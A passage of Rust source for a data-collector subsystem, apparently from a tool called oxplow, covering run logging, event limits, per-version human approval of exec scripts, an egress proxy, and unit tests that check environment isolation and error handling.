                        id: id.to_string(),
                        row_counts,
                        facts: 0,
                    })
                }
                Err(e) => e.to_string(),
            }
        }
        Err(e) => e,
    };
    let failed = run("error", Some(error.clone()));
    let envelope = event.envelope(
        "error",
        BTreeMap::new(),
        0,
        elapsed_ms(started),
        Some(error.clone()),
    );
    let vocabulary = ctx.vocabulary.clone();
    ctx.db
        .transaction(move |tx| {
            oxplow_db::collector_store::record_run_in(tx, &failed)
                .map_err(oxplow_db::map_sql_err)?;
            oxplow_db::event_log_store::append_tx(tx, &vocabulary.current(), &envelope).map(|_| ())
        })
        .await
        .map_err(RunCollectorError::Storage)?;
    Err(RunCollectorError::Failed(error))
}

/// The most events one run may emit: a collector reports what happened,
/// it doesn't replay a history into the log.
pub const MAX_RUN_EVENTS: usize = 100;

/// The events a collector's script returned as it may log them (P9.D2):
/// each one of its **extension's own declared types**, at that type's
/// newest version, from `collector:<owner>/<id>` — the rule a command's
/// or an effect's script is held to ([`own_events`]). Refused: a project
/// or built-in collector's (it has no namespace to declare types in), a
/// type the collector itself runs on (its run would trigger itself), and
/// more than [`MAX_RUN_EVENTS`].
///
/// A collector **ingests**: its events say what it saw. Acting on what
/// was seen — composing commands, with rights and a person's approval —
/// is an effect's, which may react to these.
fn plan_events(
    vocabulary: &oxplow_domain::vocabulary::Vocabulary,
    owner: &str,
    spec: &CollectorSpec,
    events: Vec<crate::extension_commands::ComposedEvent>,
) -> Result<Vec<Envelope>, String> {
    use oxplow_config::collectors::{Trigger, BUILT_IN, PROJECT};
    if events.is_empty() {
        return Ok(Vec::new());
    }
    let id = &spec.id;
    if [PROJECT, BUILT_IN].contains(&owner) {
        return Err(format!(
            "collector `{owner}/{id}` returned `events`, which only an extension's collector \
             may: event types are declared by an extension (`event_types:`)"
        ));
    }
    if events.len() > MAX_RUN_EVENTS {
        return Err(format!(
            "collector `{owner}/{id}` returned {} events; a run may emit at most {MAX_RUN_EVENTS}",
            events.len()
        ));
    }
    if let Trigger::On { events: on, .. } = &spec.trigger {
        if let Some(own) = events.iter().find(|e| on.contains(&e.event_type)) {
            return Err(format!(
                "collector `{owner}/{id}` may not emit `{}`, a type it runs on: its run would \
                 trigger itself",
                own.event_type
            ));
        }
    }
    let source = oxplow_domain::refs::build::collector_ref(owner, id);
    let envelopes = crate::extension_commands::own_events(vocabulary, owner, &source, events)
        .map_err(|e| format!("collector `{owner}/{id}`: {e}"))?;
    // What the append would refuse (a payload its schema doesn't take) is
    // this run's error, before anything is written.
    for e in &envelopes {
        vocabulary
            .validate(&e.event_type, e.v, &e.payload)
            .map_err(|err| format!("collector `{owner}/{id}`: {err}"))?;
    }
    Ok(envelopes)
}

/// What a run's `collector.synced@1` says about who ran which collector.
#[derive(Clone)]
struct Synced {
    source: String,
    /// `collector:<owner>/<id>`.
    collector: String,
    trigger: &'static str,
    /// The trigger event (`on:`): the envelope's cause, and its seq keys
    /// the dedupe, so a redelivery can't log a second run.
    cause: Option<(oxplow_domain::EventId, i64)>,
}

impl Synced {
    fn envelope(
        &self,
        status: &str,
        entities: BTreeMap<String, i64>,
        facts: i64,
        elapsed_ms: i64,
        error: Option<String>,
    ) -> Envelope {
        let env = Envelope::typed::<CollectorSynced>(
            self.source.clone(),
            &CollectorSyncedV1 {
                collector: self.collector.clone(),
                trigger: self.trigger.into(),
                status: status.into(),
                entities,
                facts,
                elapsed_ms,
                error,
            },
        )
        .with_subject([self.collector.clone()]);
        match &self.cause {
            Some((id, seq)) => env
                .with_cause(id.clone())
                .with_dedupe_key(format!("collector.synced:{}:{seq}", self.collector)),
            None => env,
        }
    }
}

fn elapsed_ms(started: std::time::Instant) -> i64 {
    i64::try_from(started.elapsed().as_millis()).unwrap_or(i64::MAX)
}

/// Where a run is recorded — its `collector_run` row and its
/// `collector.synced@1`, in one transaction — and what its `input` is read
/// through. The fact engine holds one; an entity run commits the same two
/// with its rows.
#[derive(Clone)]
pub struct RunLog {
    pub db: oxplow_db::Database,
    pub vocabulary: VocabularyHandle,
    pub layer: crate::sql_gateway::SqlGateway,
}

/// One run to record (see [`RunLog::record`]).
pub struct RunRecord<'a> {
    pub owner: &'a str,
    pub id: &'a str,
    /// `manual`, `every` or `on`.
    pub trigger: &'static str,
    /// Who ran it, as an event source (`system`, `human`, `agent:<thread>`).
    pub source: &'a str,
    /// The trigger event (`on`): the run's `last_event_id`, its event's
    /// cause and dedupe key.
    pub cause: Option<&'a StoredEvent>,
    /// `ok` or `error`.
    pub status: &'a str,
    pub entities: BTreeMap<String, i64>,
    pub facts: i64,
    pub elapsed_ms: i64,
    pub error: Option<String>,
}

impl RunLog {
    /// The plugin failure policy, over this log's database.
    pub fn health(&self) -> crate::plugin_health::PluginHealth {
        crate::plugin_health::PluginHealth::new(self.db.clone(), self.vocabulary.clone())
    }

    /// Whether collector `owner/id` already ran for the event at `seq` (its
    /// `last_event_id` is at or past it): a redelivery runs nothing.
    pub async fn ran_for(&self, owner: &str, id: &str, seq: i64) -> bool {
        let (owner, id) = (owner.to_string(), id.to_string());
        self.db
            .read(move |c| {
                c.query_row(
                    "SELECT coalesce(last_event_id, 0) FROM collector_run WHERE owner = ?1 AND id = ?2",
                    [&owner, &id],
                    |r| r.get::<_, i64>(0),
                )
                .map(Some)
                .or_else(|e| match e {
                    rusqlite::Error::QueryReturnedNoRows => Ok(None),
                    e => Err(e),
                })
                .map_err(oxplow_db::map_sql_err)
            })
            .await
            .ok()
            .flatten()
            .is_some_and(|last| last >= seq)
    }

    /// Record `r`: its `collector_run` row and its `collector.synced@1`.
    /// A redelivered trigger event (same dedupe key) writes nothing.
    pub async fn record(&self, r: RunRecord<'_>) -> Result<(), DomainError> {
        self.record_with(r, None).await.map(|_| ())
    }

    /// [`Self::record`] with a fact collector's `capture` and its facts in
    /// the same transaction (tsk712), so a run never lands without its
    /// record or twice for one trigger event. `false` when the event's run
    /// was already recorded (nothing written).
    pub async fn record_with(
        &self,
        r: RunRecord<'_>,
        capture: Option<(oxplow_db::NewMetricCapture, Vec<oxplow_db::NewFact>)>,
    ) -> Result<bool, DomainError> {
        let run = CollectorRun {
            owner: r.owner.to_string(),
            id: r.id.to_string(),
            status: r.status.to_string(),
            last_run_at: now_rfc3339(),
            error: r.error.clone(),
            row_counts: r.entities.clone(),
            cursor: None,
            last_event_id: r.cause.map(|e| e.seq),
        };
        let synced = Synced {
            source: r.source.to_string(),
            collector: oxplow_domain::refs::build::collector_ref(r.owner, r.id),
            trigger: r.trigger,
            cause: r.cause.map(|e| (e.envelope.id.clone(), e.seq)),
        };
        let envelope = synced.envelope(r.status, r.entities, r.facts, r.elapsed_ms, r.error);
        let vocabulary = self.vocabulary.clone();
        self.db
            .transaction(move |tx| {
                if !oxplow_db::event_log_store::append_unique_tx(
                    tx,
                    &vocabulary.current(),
                    &envelope,
                )? {
                    return Ok(false);
                }
                if let Some((capture, facts)) = &capture {
                    oxplow_db::fact_store::record_facts_tx(
                        tx,
                        capture.clone(),
                        facts.clone(),
                        None,
                    )?;
                }
                oxplow_db::collector_store::record_run_in(tx, &run)
                    .map_err(oxplow_db::map_sql_err)?;
                Ok(true)
            })
            .await
    }
}

/// What [`run_for_event`] did.
#[derive(Debug)]
pub enum EventRun {
    /// It had already run for this event (a redelivery), or it's gone.
    Skipped,
    /// An exec collector nobody approved: recorded, nothing ran.
    NeedsApproval,
    /// The loop guard refused it: recorded as skipped, nothing ran.
    Guarded,
    /// It ran: its report, or what failed (recorded and announced).
    Ran(Result<CollectorRunReport, String>),
}

/// Run collector `owner/id` for `event`, as the system (the
/// `collector.triggers` consumer). Idempotent per event: a collector whose
/// `last_event_id` is already at or past the event's seq is skipped.
pub async fn run_for_event(
    ctx: &Collectors<'_>,
    owner: &str,
    id: &str,
    event: Arc<StoredEvent>,
) -> Result<EventRun, DomainError> {
    let seq = event.seq;
    if ctx
        .store
        .run_of(owner, id)
        .await?
        .and_then(|r| r.last_event_id)
        .is_some_and(|last| last >= seq)
    {
        return Ok(EventRun::Skipped);
    }
    // The loop guard (P9.D2): an event this collector's own run led to,
    // or one a chain of reactions already at the limit led to, runs
    // nothing — recorded as skipped (the last good counts stay), never as
    // a failure.
    let own = oxplow_domain::refs::build::collector_ref(owner, id);
    if let Some(why) = crate::event_lineage::lineage(&ctx.db, &event, &own)
        .await?
        .refusal()
    {
        ctx.store
            .record_run(CollectorRun {
                owner: owner.to_string(),
                id: id.to_string(),
                status: "skipped".into(),
                last_run_at: now_rfc3339(),
                error: Some(why),
                row_counts: BTreeMap::new(),
                cursor: None,
                last_event_id: Some(seq),
            })
            .await?;
        return Ok(EventRun::Guarded);
    }
    let source = oxplow_domain::Actor::System.source();
    match run_collector(ctx, owner, id, RunTrigger::On(event), &source).await {
        Ok(report) => Ok(EventRun::Ran(Ok(report))),
        Err(RunCollectorError::Failed(m)) => Ok(EventRun::Ran(Err(m))),
        Err(RunCollectorError::NotFound | RunCollectorError::Disabled(_)) => Ok(EventRun::Skipped),
        Err(RunCollectorError::NeedsApproval(m)) => {
            ctx.store
                .record_run(CollectorRun {
                    owner: owner.to_string(),
                    id: id.to_string(),
                    status: "needs_approval".into(),
                    last_run_at: now_rfc3339(),
                    error: Some(m),
                    row_counts: BTreeMap::new(),
                    cursor: None,
                    last_event_id: Some(seq),
                })
                .await?;
            Ok(EventRun::NeedsApproval)
        }
        Err(RunCollectorError::Storage(e)) => Err(e),
    }
}

/// Now as RFC 3339, as `Timestamp` serializes.
fn now_rfc3339() -> String {
    serde_json::to_value(oxplow_domain::Timestamp::now())
        .ok()
        .and_then(|v| v.as_str().map(str::to_string))
        .unwrap_or_default()
}

/// Rows per entity a preview shows.
const PREVIEW_ROWS: usize = 50;

/// What a collector would store, without storing it or recording a run:
/// how an agent checks a collector it's writing in a worktree stream
/// (collected data is project-wide, so a real run there would overwrite
/// the project's rows, tsk377). The same consent applies: an exec
/// collector runs only at a version a person approved.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CollectorPreview {
    pub owner: String,
    pub id: String,
    pub entities: Vec<EntityPreview>,
    /// The events it would log (P9.D2), checked as a run's are.
    pub events: Vec<EventPreview>,
}

/// An event a collector's run would log.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct EventPreview {
    #[serde(rename = "type")]
    pub event_type: String,
    pub v: u32,
    pub payload: serde_json::Value,
    pub subject: Vec<String>,
}

/// One entity of a [`CollectorPreview`]: its first rows, coerced to the
/// declared columns.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct EntityPreview {
    pub entity: String,
    pub view: String,
    pub columns: Vec<String>,
    /// At most [`PREVIEW_ROWS`].
    pub rows: Vec<Vec<SqlCell>>,
    /// Rows the run returned for it.
    pub total: usize,
    /// Keys an upsert run would delete.
    pub deleted: usize,
}

/// Run a collector and return what it would store (see [`CollectorPreview`]).
/// `rows` stand in for a derived collector's `input` rows (an example's
/// fixture, `oxplow plugin test`).
pub async fn preview_collector(
    ctx: &Collectors<'_>,
    owner: &str,
    id: &str,
    rows: Option<Vec<serde_json::Value>>,
) -> Result<CollectorPreview, RunCollectorError> {
    let (spec, output) = produce(ctx, owner, id, None, rows).await?;
    let mut output = output.map_err(RunCollectorError::Failed)?;
    let events = plan_events(
        &ctx.vocabulary.current(),
        owner,
        &spec,
        std::mem::take(&mut output.events),
    )
    .map_err(RunCollectorError::Failed)?
    .into_iter()
    .map(|e| EventPreview {
        event_type: e.event_type,
        v: e.v,
        payload: e.payload,
        subject: e.subject,
    })
    .collect();
    let writes = plan_writes(owner, &spec, output).map_err(RunCollectorError::Failed)?;
    let entities = writes
        .into_iter()
        .map(|(table, write)| {
            let (rows, deleted) = match write {
                EntityWrite::Replace(rows) => (rows, 0),
                EntityWrite::Upsert { rows, deleted } => (rows, deleted.len()),
            };
            EntityPreview {
                total: rows.len(),
                rows: rows.into_iter().take(PREVIEW_ROWS).collect(),
                deleted,
                columns: table.columns.iter().map(|c| c.name.clone()).collect(),
                entity: table.entity,
                view: table.view,
            }
        })
        .collect();
    Ok(CollectorPreview {
        owner: owner.to_string(),
        id: id.to_string(),
        entities,
        events,
    })
}

/// The extension and spec of collector `owner/id` in `ctx.root`.
fn find_collector(
    ctx: &Collectors<'_>,
    owner: &str,
    id: &str,
) -> Result<(crate::extensions::Extension, CollectorSpec), RunCollectorError> {
    let ext = ctx
        .catalog
        .get(ctx.root)
        .iter()
        .find(|e| e.name == owner)
        .cloned()
        .ok_or(RunCollectorError::NotFound)?;
    let spec = ext
        .collectors
        .iter()
        .find(|s| s.id == id)
        .cloned()
        .ok_or(RunCollectorError::NotFound)?;
    Ok((ext, spec))
}

/// A person approves exec collector `owner/id` on this machine at
/// `version` — the listing's version they reviewed (UI only; an agent can't
/// approve). A collector that changed since is refused, and nothing is
/// recorded. A derived collector runs no program and needs no approval.
pub fn approve_reviewed(
    ctx: &Collectors<'_>,
    owner: &str,
    id: &str,
    version: &str,
) -> Result<(), RunCollectorError> {
    let (ext, spec) = find_collector(ctx, owner, id)?;
    if spec.runtime.is_derived() {
        return Ok(());
    }
    let hash = approval_hash(&ctx.root.join(&ext.path), &spec).map_err(|e| {
        RunCollectorError::Failed(format!(
            "collector `{id}`: entry `{}`: {e}",
            entry_of(&spec)
        ))
    })?;
    if version != hash {
        return Err(RunCollectorError::NeedsApproval(format!(
            "collector `{owner}/{id}` changed since you reviewed it; look at it again before \
             approving"
        )));
    }
    approve(ctx.approvals, owner, id, &hash).map_err(|e| {
        RunCollectorError::Storage(DomainError::Storage(format!("record approval: {e}")))
    })
}

/// Find a collector in `ctx.root` and run it, stopping at its output. The
/// outer error means it didn't run (unknown, not approved, or a `read`
/// collector, which `provider.sync` runs); the inner one that it ran and
/// failed.
async fn produce(
    ctx: &Collectors<'_>,
    owner: &str,
    id: &str,
    event: Option<&StoredEvent>,
    rows: Option<Vec<serde_json::Value>>,
) -> Result<(CollectorSpec, Result<ScriptOutput, String>), RunCollectorError> {
    let (root, approvals) = (ctx.root, ctx.approvals);
    let (ext, spec) = find_collector(ctx, owner, id)?;
    let ext_dir = root.join(&ext.path);
    if spec.runtime == CollectorRuntime::Read {
        return Err(RunCollectorError::Failed(format!(
            "collector `{owner}/{id}` reads a provider; run `provider.sync` for it"
        )));
    }
    if spec.runtime.is_derived() {
        let output = match crate::extensions::read_extension_file(root, &ext.name, entry_of(&spec))
        {
            Some(script) => {
                let oracle = crate::ai_compute::CollectorOracle::new(
                    ctx.ai.clone(),
                    format!("collector:{}/{}", ext.name, spec.id),
                );
                derive_collector(
                    &ctx.layer,
                    script,
                    &spec,
                    std::sync::Arc::new(oracle),
                    event,
                    rows,
                    oxplow_collect_plugin::SandboxBudget::default(),
                )
                .await
            }
            None => Err(format!(
                "collector `{id}`: entry `{}` doesn't exist in the extension",
                entry_of(&spec)
            )),
        };
        return Ok((spec, output));
    }
    let hash = approval_hash(&ext_dir, &spec).map_err(|e| {
        RunCollectorError::Failed(format!(
            "collector `{id}`: entry `{}`: {e}",
            entry_of(&spec)
        ))
    })?;
    if !is_approved(approvals, owner, id, &hash) {
        return Err(RunCollectorError::NeedsApproval(format!(
            "collector `{owner}/{id}` runs `{}` and needs a person's approval first \
             (Settings → Data → Approve & Run). Approval is per machine and per script version.",
            entry_of(&spec)
        )));
    }

    let mut credentials = BTreeMap::new();
    let mut missing = None;
    for name in &spec.credentials {
        match ctx
            .secrets
            .get(&credential_account(&ctx.project, owner, name))
        {
            Ok(Some(v)) => {
                credentials.insert(name.clone(), v);
            }
            // Unset: the script decides (it may have a fallback).
            Ok(None) => {}
            Err(e) => missing = Some(format!("credential `{name}`: {e}")),
        }
    }
    let output = match missing {
        Some(e) => Err(e),
        None => exec_approved(&ext_dir, &spec, credentials).await,
    };
    Ok((spec, output))
}

/// What running a collector needs, owned: the `collector.sync` command
/// holds one (it's registered while `Services` is built).
#[derive(Clone)]
pub struct CollectorRunner {
    pub project_dir: PathBuf,
    pub approvals: Arc<crate::exec_consent::ApprovalStore>,
    pub store: Arc<SqliteCollectorStore>,
    pub db: oxplow_db::Database,
    pub vocabulary: VocabularyHandle,
    pub secrets: Arc<dyn SecretStore>,
    pub layer: crate::sql_gateway::SqlGateway,
    pub catalog: Arc<crate::extension_catalog::ExtensionCatalog>,
    pub ai: Arc<crate::ai_compute::AiCompute>,
    pub worktrees: Arc<crate::worktrees::WorktreeRouter>,
    /// The fact engine, which runs the collectors that record facts.
    pub metrics: crate::metrics_service::MetricsService,
}

impl CollectorRunner {
    fn collectors<'a>(&'a self, root: &'a Path) -> Collectors<'a> {
        Collectors {
            root,
            project: project_key(&self.project_dir),
            approvals: &self.approvals,
            store: &self.store,
            db: self.db.clone(),
            vocabulary: self.vocabulary.clone(),
            secrets: self.secrets.as_ref(),
            layer: self.layer.clone(),
            catalog: &self.catalog,
            ai: self.ai.clone(),
        }
    }

    /// Run a collector from the primary worktree (collected data is
    /// project-wide). It never approves: a refused run (no consent) or an
    /// unknown collector changes nothing; one that ran is announced by its
    /// `collector_run` commit (`v_collector_run` changes).
    pub async fn sync(
        &self,
        owner: &str,
        id: &str,
        trigger: RunTrigger,
        source: &str,
    ) -> Result<CollectorRunReport, RunCollectorError> {
        // A fact collector (the project's, a built-in or an extension's
        // that records facts) runs in the fact engine.
        if self
            .metrics
            .fact_collectors()
            .iter()
            .any(|c| c.owner == owner && c.key == id)
        {
            let health =
                crate::plugin_health::PluginHealth::new(self.db.clone(), self.vocabulary.clone());
            if let Some(reason) = health
                .disabled_reason(&plugin_key(owner, id))
                .await
                .map_err(RunCollectorError::Storage)?
            {
                return Err(RunCollectorError::Disabled(format!(
                    "collector `{owner}/{id}` is disabled: {reason}. A person can enable it \
                     again (`plugin.enable`, Settings → Extensions)."
                )));
            }
            let facts = self
                .metrics
                .run_collector_by_key(owner, id, None, source)
                .await
                .map_err(RunCollectorError::Failed)?;
            return Ok(CollectorRunReport {
                owner: owner.to_string(),
                id: id.to_string(),
                row_counts: BTreeMap::new(),
                facts: i64::try_from(facts).unwrap_or(i64::MAX),
            });
        }
        let root = self.worktrees.resolve(None).await;
        run_collector(&self.collectors(&root), owner, id, trigger, source).await
    }
}

/// `collector.sync { owner, id }`: run an approved collector now
/// (External: it runs the collector's program or script). Any actor may
/// run it; none approves through it — consent is a person's, in Settings
/// → Data. Run by the system it's the `every:` schedule's run.
pub const SYNC: &str = "collector.sync";

#[derive(Debug, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct SyncInput {
    /// The extension that declares it.
    pub owner: String,
    /// The collector's `id` in its owner's `collectors:`.
    pub id: String,
}

pub fn sync_command(sync: CollectorRunner) -> crate::commands::Command {
    use crate::commands::{Command, Handler, HandlerOutput};
    use oxplow_domain::{
        Atomicity, CommandEffect, CommandError, CommandSpec, Confirm, Invokers, Lifecycle,
    };
    Command::new(
        CommandSpec {
            name: SYNC.into(),
            summary: "Run an approved collector now, refreshing what it collects (runs the \
                      collector's program or script, which the bus doesn't own). It never \
                      approves: an unapproved exec collector is refused."
                .into(),
            input_schema: serde_json::to_value(schemars::schema_for!(SyncInput))
                .expect("schema serializes"),
            invokers: Invokers::ALL,
            confirm: Confirm::Never,
            undoable: false,
            lifecycle: Lifecycle::Stable,
            atomicity: Atomicity::External,
            effect: CommandEffect::Write,
        },
        Handler::External(std::sync::Arc::new(move |actor, input| {
            let sync = sync.clone();
            let source = actor.source();
            let trigger = match actor {
                oxplow_domain::Actor::System => RunTrigger::Every,
                _ => RunTrigger::Manual,
            };
            Box::pin(async move {
                let input: SyncInput =
                    serde_json::from_value(input).map_err(|e| CommandError::Invalid {
                        field: None,
                        message: e.to_string(),
                    })?;
                let report =
                    sync.sync(&input.owner, &input.id, trigger, &source)
                        .await
                        .map_err(|e| match e {
                            RunCollectorError::NotFound => CommandError::Invalid {
                                field: Some("/id".into()),
                                message: format!(
                                    "no collector `{}/{}` in the project's extensions",
                                    input.owner, input.id
                                ),
                            },
                            RunCollectorError::NeedsApproval(m)
                            | RunCollectorError::Disabled(m) => CommandError::Invalid {
                                field: Some("/id".into()),
                                message: m,
                            },
                            RunCollectorError::Failed(m) => CommandError::Failed { message: m },
                            RunCollectorError::Storage(e) => CommandError::from(e),
                        })?;
                Ok(HandlerOutput {
                    result: serde_json::to_value(report).expect("report serializes"),
                    ..HandlerOutput::default()
                })
            })
        })),
    )
    .expect("collector.sync registers")
}

/// Run an approved exec collector and parse its output.
async fn exec_approved(
    ext_dir: &Path,
    spec: &CollectorSpec,
    credentials: BTreeMap<String, String>,
) -> Result<ScriptOutput, String> {
    let dir = ext_dir.to_path_buf();
    let spec_owned = spec.clone();
    // Where it's enforced, the program's only way out is a proxy that goes
    // just to its declared hosts; the proxy stops when this run ends.
    let proxy = if crate::net_sandbox::enforced() {
        Some(
            crate::net_sandbox::EgressProxy::start(spec.network.clone())
                .await
                .map_err(|e| format!("couldn't start the egress proxy: {e}"))?,
        )
    } else {
        None
    };
    let egress = match &proxy {
        Some(p) => Egress::Sandboxed { proxy_env: p.env() },
        None => Egress::Open,
    };
    let raw = tokio::task::spawn_blocking(move || {
        exec_collector(
            &dir,
            &spec_owned,
            &|k| std::env::var(k).ok(),
            &credentials,
            COLLECTOR_TIMEOUT,
            &egress,
        )
    })
    .await
    .map_err(|e| format!("collector task panicked: {e}"))??;
    Ok(raw)
}

/// A run's output as the writes it makes, coerced to the declared columns.
/// Publish every entity the enabled `extensions` declare, empty — what a
/// throwaway oxplow (`oxplow plugin test`, P7.C6) does so the models and
/// lenses over them run before any collector has. Never on a project's
/// own database: an empty publish replaces what was collected.
pub async fn publish_declared_empty(
    db: &oxplow_db::Database,
    extensions: &[crate::extensions::Extension],
) -> Result<(), DomainError> {
    let mut writes = Vec::new();
    for ext in extensions.iter().filter(|e| e.enabled) {
        for spec in ext.collectors.iter().filter(|c| !c.entities.is_empty()) {
            let empty = ScriptOutput {
                entities: spec
                    .entities
                    .iter()
                    .map(|e| (e.name.clone(), Vec::new()))
                    .collect(),
                deleted: BTreeMap::new(),
                events: Vec::new(),
            };
            writes.extend(plan_writes(&ext.name, spec, empty).map_err(DomainError::Invalid)?);
        }
    }
    db.transaction(move |tx| oxplow_db::collector_store::write_rows_tx(tx, &writes).map(|_| ()))
        .await
}

fn plan_writes(
    owner: &str,
    spec: &CollectorSpec,
    mut output: ScriptOutput,
) -> Result<Vec<(EntityTable, EntityWrite)>, String> {
    let mut writes = Vec::new();
    for entity in &spec.entities {
        let rows = output.entities.remove(&entity.name);
        let write = match spec.sync {
            // An entity the run didn't mention this run is left empty.
            CollectorSync::Replace => {
                EntityWrite::Replace(coerce_rows(entity, rows.unwrap_or_default())?)
            }
            CollectorSync::Upsert => {
                let deleted = output.deleted.remove(&entity.name).unwrap_or_default();
                // Nothing said about it: leave it alone.
                if rows.is_none() && deleted.is_empty() {
                    continue;
                }
                EntityWrite::Upsert {
                    rows: coerce_rows(entity, rows.unwrap_or_default())?,
                    deleted: coerce_keys(entity, deleted)?,
                }
            }
        };
        writes.push((
            EntityTable {
                extension: owner.to_string(),
                entity: entity.name.clone(),
                view: entity.view.clone(),
                key: entity.key.clone(),
                description: entity_description(owner, entity),
                columns: entity
                    .columns
                    .iter()
                    .map(|c| oxplow_db::EntityColumn {
                        name: c.name.clone(),
                        stored: stored(c.col_type),
                        doc: c.doc.clone(),
                    })
                    .collect(),
            },
            write,
        ));
    }
    Ok(writes)
}

/// An entity's catalog description: its doc (or where it comes from),
/// then the joins it documents.
fn entity_description(owner: &str, entity: &EntityDecl) -> String {
    let mut out = if entity.doc.trim().is_empty() {
        format!(
            "`{}` records collected by the `{owner}` extension.",
            entity.name
        )
    } else {
        entity.doc.trim().to_string()
    };
    for r in &entity.relations {
        out.push_str(&format!(" Joins `{}` on `{}`.", r.to, r.on));
    }
    out
}

/// Coerce tombstone keys to the entity key column's type.
fn coerce_keys(entity: &EntityDecl, keys: Vec<serde_json::Value>) -> Result<Vec<SqlCell>, String> {
    let rows = keys
        .into_iter()
        .map(|k| serde_json::json!({ entity.key.clone(): k }))
        .collect();
    // Reuse the row coercion on one-column rows of just the key.
    let key_only = EntityDecl {
        columns: entity
            .columns
            .iter()
            .filter(|c| c.name == entity.key)
            .cloned()
            .collect(),
        ..entity.clone()
    };
    Ok(coerce_rows(&key_only, rows)?
        .into_iter()
        .filter_map(|mut r| r.pop())
        .collect())
}

#[cfg(test)]
pub(crate) mod tests {
    /// An `AiCompute` with no roles assigned (these sources don't call
    /// models).
    fn no_ai() -> std::sync::Arc<crate::ai_compute::AiCompute> {
        let db = oxplow_db::Database::in_memory();
        std::sync::Arc::new(crate::ai_compute::AiCompute::new(
            std::sync::Arc::new(crate::ai_service::AiService::new(
                oxplow_ai::client::Client::default(),
                std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
                std::sync::Arc::new(oxplow_db::SqliteAiCallStore::new(db.clone())),
                None,
            )),
            oxplow_db::SqliteAiResultStore::new(db),
        ))
    }

    use super::*;
    use oxplow_config::collectors::parse_collectors;
    use oxplow_domain::CommandError;
    use serde_json::json;

    /// The version a person would see in the listing right now.
    /// A person approves the version they reviewed, then it runs.
    async fn reviewed_run(
        ctx: &Collectors<'_>,
        extension: &str,
        source: &str,
        version: &str,
    ) -> Result<CollectorRunReport, RunCollectorError> {
        approve_reviewed(ctx, extension, source, version)?;
        run_collector(ctx, extension, source, RunTrigger::Manual, "human").await
    }

    async fn version_of(ctx: &Collectors<'_>, extension: &str, source: &str) -> String {
        list_collectors(ctx)
            .await
            .unwrap()
            .into_iter()
            .find(|l| l.owner == extension && l.spec.id == source)
            .and_then(|l| l.version)
            .unwrap_or_default()
    }

    fn spec(entry: &str, env: &[&str]) -> CollectorSpec {
        let yaml = format!(
            "- id: gh\n  runtime: exec\n  entry: {entry}\n  env: [{}]\n  entities:\n    - name: pr\n      key: number\n      columns: {{ number: int, title: text, score: real, draft: bool, opened_at: time }}\n",
            env.join(", ")
        );
        let (s, e) = parse_collectors("my-gh", &serde_yaml::from_str(&yaml).unwrap(), &|_| true);
        assert!(e.is_empty(), "{e:?}");
        s.into_iter().next().unwrap()
    }

    fn script(dir: &Path, name: &str, body: &str) {
        use std::os::unix::fs::PermissionsExt;
        let p = dir.join(name);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(&p, format!("#!/bin/sh\n{body}\n")).unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[test]
    fn approvals_are_bound_to_the_entry_hash() {
        let ext = tempfile::tempdir().unwrap();
        let state = tempfile::tempdir().unwrap();
        script(ext.path(), "bin/sync.sh", "echo one");
        let h1 = entry_hash(ext.path(), "bin/sync.sh").unwrap();
        let approvals = crate::exec_consent::ApprovalStore::for_tests(state.path());
        assert!(!is_approved(&approvals, "my-gh", "gh", &h1));
        approve(&approvals, "my-gh", "gh", &h1).unwrap();
        assert!(is_approved(&approvals, "my-gh", "gh", &h1));
        assert!(!is_approved(&approvals, "my-gh", "other", &h1));
        script(ext.path(), "bin/sync.sh", "echo two");
        let h2 = entry_hash(ext.path(), "bin/sync.sh").unwrap();
        assert_ne!(h1, h2);
        assert!(
            !is_approved(&approvals, "my-gh", "gh", &h2),
            "a changed script needs re-approval"
        );
    }

    #[test]
    fn exec_passes_only_declared_env_and_parses_entities() {
        let ext = tempfile::tempdir().unwrap();
        script(
            ext.path(),
            "bin/sync.sh",
            r#"printf '{"entities":{"pr":[{"number":1,"title":"%s|%s"}]}}' "$GH_TOKEN" "$SECRET""#,
        );
        let env = |k: &str| match k {
            "GH_TOKEN" => Some("tok".to_string()),
            "SECRET" => Some("leak".to_string()),
            _ => None,
        };
        let out = exec_collector(
            ext.path(),
            &spec("bin/sync.sh", &["GH_TOKEN"]),
            &env,
            &BTreeMap::new(),
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap();
        assert_eq!(out.entities["pr"][0]["title"], json!("tok|"));
    }

    #[test]
    fn exec_reports_failures_timeouts_and_bad_output() {
        let ext = tempfile::tempdir().unwrap();
        let none = |_: &str| None;
        script(ext.path(), "fail.sh", "echo boom >&2; exit 3");
        let e = exec_collector(
            ext.path(),
            &spec("fail.sh", &[]),
            &none,
            &BTreeMap::new(),
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap_err();
        assert!(e.contains("exit") && e.contains("boom"), "{e}");

        script(ext.path(), "slow.sh", "sleep 5");
        let e = exec_collector(
            ext.path(),
            &spec("slow.sh", &[]),
            &none,
            &BTreeMap::new(),
            Duration::from_millis(300),
            &Egress::Open,
        )
        .unwrap_err();
        assert!(e.contains("timed out"), "{e}");

        script(ext.path(), "junk.sh", "echo not json");
        let e = exec_collector(
            ext.path(),
            &spec("junk.sh", &[]),
            &none,
            &BTreeMap::new(),
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap_err();
        assert!(e.contains("JSON"), "{e}");

        script(
            ext.path(),
            "undeclared.sh",
            r#"echo '{"entities":{"issue":[]}}'"#,
        );
        let e = exec_collector(
            ext.path(),
            &spec("undeclared.sh", &[]),
            &none,
            &BTreeMap::new(),
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap_err();
        assert!(e.contains("issue"), "{e}");

        let e = exec_collector(
            ext.path(),
            &spec("missing.sh", &[]),
            &none,
            &BTreeMap::new(),
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap_err();
        assert!(e.contains("missing.sh"), "{e}");
    }

    #[test]
    fn coerces_rows_to_declared_types() {
        let s = spec("x", &[]);
        let e = &s.entities[0];
        let rows = coerce_rows(
            e,
